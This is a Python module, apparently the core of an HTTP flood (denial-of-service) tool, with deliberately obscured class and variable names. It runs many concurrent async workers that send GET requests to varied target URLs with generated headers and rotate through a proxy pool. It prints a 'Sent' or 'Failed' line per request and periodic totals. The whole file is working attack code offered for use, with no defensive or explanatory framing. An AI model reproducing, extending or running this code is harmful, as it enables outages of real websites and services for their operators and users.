import asyncio,random,sys,time
from .config import AASHU,AASHU1,AASHU7,AASHU8,AASHU9
from .headers import bld
from .client import AASHU2
from .vectors import AASHU3
class AASHU1:
    def __init__(self,u:str,r):self.u=u;self.r=r;self.s=0;self.f=0;self.st=False;self.lk=asyncio.Lock();self.pl=asyncio.Lock();self.fc={};self.ps={};self.ub=AASHU3(u)
    def _f(self,p):
        k=p or "__direct__";x=self.fc.get(k)
        if x is None:x=AASHU2(self.ub.h);self.fc[k]=x
        return x
    async def em(self,g:str):
        async with self.pl:sys.stdout.write(g+"\n");sys.stdout.flush()
    async def fr(self):
        if self.st:return
        if self.r is not None:
            p=await self.r.nx()
            if p is None:self.st=True;return
            s=self.ps.get(p)
            if s is None:s=asyncio.Semaphore(AASHU1);self.ps[p]=s
            async with s:await self._d(p)
        else:await self._d(None)
    async def _d(self,p):
        u=self.ub.nx();h=bld();f=self._f(p);cl=f.gt(p)
        try:
            await cl.get(u,headers=h)
            if p:await self.r.ok(p)
            async with self.lk:self.s+=1
            await self.em("Sent")
        except BaseException:
            if p:await self.r.fa(p)
            async with self.lk:self.f+=1
            await self.em("Failed")
    async def wk(self):
        while not self.st:
            try:await self.fr()
            except BaseException:pass
            await asyncio.sleep(random.uniform(AASHU8,AASHU9))
    async def sm(self):
        while not self.st:
            await asyncio.sleep(AASHU7)
            async with self.lk:s=self.s;f=self.f
            a=self.r.al() if self.r else "-"
            tot=len(self.r.r) if self.r else "-"
            async with self.pl:sys.stdout.write(f"--- summary sent={s} failed={f} proxies={a}/{tot} ---\n");sys.stdout.flush()
    async def rn(self):
        ts=[asyncio.create_task(self.wk())for _ in range(AASHU)]
        sm=asyncio.create_task(self.sm())
        try:
            while not self.st:await asyncio.sleep(1)
        except(asyncio.CancelledError,KeyboardInterrupt):self.st=True
        for t in ts:t.cancel()
        sm.cancel()
        for f in self.fc.values():await f.cls()
        return{"sent":self.s,"failed":self.f}
